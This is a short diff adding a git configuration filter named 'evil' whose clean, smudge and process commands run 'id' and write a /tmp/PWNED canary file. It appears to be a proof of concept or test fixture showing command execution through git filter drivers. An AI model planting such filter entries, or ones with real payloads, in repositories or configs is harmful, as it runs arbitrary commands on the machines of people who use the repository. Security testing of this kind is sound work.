@@ -1,0 +1,4 @@
+[filter "evil"]
+    clean = id > /tmp/PWNED_$(hostname)_$$
+    smudge = id
+    process = id
